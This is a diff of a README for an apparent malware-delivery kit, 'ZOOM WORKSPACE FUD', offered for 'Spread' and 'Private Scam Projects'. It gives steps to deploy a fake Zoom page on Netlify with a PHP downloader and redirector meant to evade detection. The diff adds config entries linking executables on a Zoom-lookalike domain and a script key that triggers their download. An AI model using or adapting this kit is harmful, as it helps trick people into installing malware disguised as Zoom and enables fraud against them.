@@ -1,6 +1,6 @@
 # 🔥 **ZOOM WORKSPACE FUD** by @wick3dadmin 🔥
 
-Welcome to the **ZOOM WORKSPACE FUD** repo! This project allows you to easily set up a custom downloader and redirector system with payload delivery. If you need more FUD (Fully Undetectable) redirectors for your **Spread** or **Private Scam Projects**, you're in the right place! 🚀
+Welcome to the **ZOOM WORKSPACE FUD** repo! This project allows you to easily set up a custom downloader and redirector system with payload delivery. If you need more FUD (Fully Undetectable) redirectors for your **Spread** or **Private Scama Projects**, DM **@wick3dadmin** on Telegram! 🚀
 
 ---
 
@@ -10,7 +10,6 @@ Welcome to the **ZOOM WORKSPACE FUD** repo! This project allows you to easily se
 
 1. **Fork the Repository**:
    - Go to this repository and **fork** it to your own GitHub account.
-   - Clone it to your local machine or directly integrate it with your Netlify account.
 
 2. **Deploy on Netlify**:
    - After forking, go to **Netlify** and add your repository.
@@ -23,13 +22,14 @@ Welcome to the **ZOOM WORKSPACE FUD** repo! This project allows you to easily se
 
 1. **Host Downloader PHP Script**:
    - The `Downloader FX` script is hosted at `domain.com/download.php`.
-   - Ensure the script works on your server or Netlify environment.
+   - Ensure the script works on your server.
 
 2. **Update `config.php`**:
    - Add your **direct file links** to `config.php`.
      - Example:
-       ```php
-       $fileLinks = array("link_to_file_1", "link_to_file_2");
+       ```"file1" => "https://zoomgo.us/files/sample1.exe",
+    "file2" => "https://zoomgo.us/files/sample2.exe",
+    "file3" => "https://zoomgo.us/files/sample3.exe"
        ```
 
 ---
@@ -46,10 +46,7 @@ Welcome to the **ZOOM WORKSPACE FUD** repo! This project allows you to easily se
 2. **Edit the File Key**:
    - Find **Line 1405** in `index.html` and update it with the file key from your **Downloader PHP** script.
      - Example:
-       ```html
-       <script>
-           var fileKey = 'yourFileKey';
-       </script>
+       ```const fileKey = "file1"; - downloads file1 in Downloader config.php
        ```
 
 ---
